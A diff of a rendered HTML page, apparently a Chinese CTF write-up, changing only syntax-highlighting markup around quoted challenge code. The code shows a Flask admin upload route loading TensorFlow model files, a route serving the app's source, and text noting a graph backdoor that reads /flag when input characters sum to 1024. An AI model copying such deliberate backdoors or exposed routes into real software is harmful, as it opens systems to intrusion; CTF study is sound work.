-    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="bp">False</span><span class="p">):</span>
-        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;admin session.&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;admin session.&#39;</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
             <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;site_description&#39;</span><span class="p">):</span>
                 <span class="n">site_description</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;site_description&#39;</span><span class="p">)</span>
             <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;site_title&#39;</span><span class="p">):</span>
                 <span class="n">site_title</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;site_title&#39;</span><span class="p">)</span>
             <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;modelFile&#39;</span><span class="p">):</span>
-                <span class="nb">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;modelFile&#39;</span><span class="p">)</span>
+                <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;modelFile&#39;</span><span class="p">)</span>
                 <span class="c1"># print(file, type(file))</span>
                 <span class="k">try</span><span class="p">:</span>
-                    <span class="n">z</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="nb">file</span><span class="p">)</span>
+                    <span class="n">z</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">file</span><span class="o">=</span><span class="n">file</span><span class="p">)</span>
                     <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;detection.meta&#39;</span><span class="p">,</span> <span class="s1">&#39;detection.index&#39;</span><span class="p">,</span> <span class="s1">&#39;detection.data-00000-of-00001&#39;</span><span class="p">]:</span>
                         <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;tf/detection_model/&#39;</span> <span class="o">+</span> <span class="n">e</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">z</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
                     <span class="n">sess</span> <span class="o">=</span> <span class="n">renew</span><span class="p">(</span><span class="n">sess</span><span class="p">,</span> <span class="n">tf_path</span><span class="p">)</span>
@@ -968,12 +968,12 @@ Todo: add /admin/model_download button  下载模型</p>
         <span class="k">return</span> <span class="s2">&#34;Not a admin **session**. &lt;a href=&#39;/&#39;&gt;Back&lt;/a&gt;&#34;</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin/source&#39;</span><span class="p">)</span> <span class="c1"># &lt;--here ♂ boy next door</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin/source&#39;</span><span class="p">)</span> <span class="c1"># &lt;--here ♂ boy next door</span>
 <span class="k">def</span> <span class="nf">get_source</span><span class="p">():</span>
     <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;app.py&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin/source_thanos&#39;</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin/source_thanos&#39;</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">get_source_broken</span><span class="p">():</span>
     <span class="s1">&#39;&#39;&#39;
 </span><span class="s1">    Thanos is eventually resurrected,[21] and collects the Infinity Gems once again.[22]
@@ -999,7 +999,7 @@ Todo: add /admin/model_download button  下载模型</p>
 <p>通过tensorflow运行下面代码，</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1013,7 +1013,7 @@ Todo: add /admin/model_download button  下载模型</p>
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">tensorflow</span> <span class="kn">as</span> <span class="nn">tf</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="nn">tf</span>
 <span class="c1"># Tensorboard可视化</span>
 <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">model_path</span><span class="p">):</span>
     <span class="n">new_sess</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
@@ -1030,7 +1030,7 @@ Todo: add /admin/model_download button  下载模型</p>
 </div><p>在对应端口查看图结构，发现当输入的字符串字符总和为1024时会触发读取<code>/flag</code>的后门，此时转向处理输入的函数：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1048,7 +1048,7 @@ Todo: add /admin/model_download button  下载模型</p>
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">predict</span><span class="p">(</span><span class="n">sess</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">predict</span><span class="p">(</span><span class="n">sess</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
     <span class="s1">&#39;&#39;&#39;
 </span><span class="s1">    :param x: input number x
 </span><span class="s1">        sess: tensorflow session
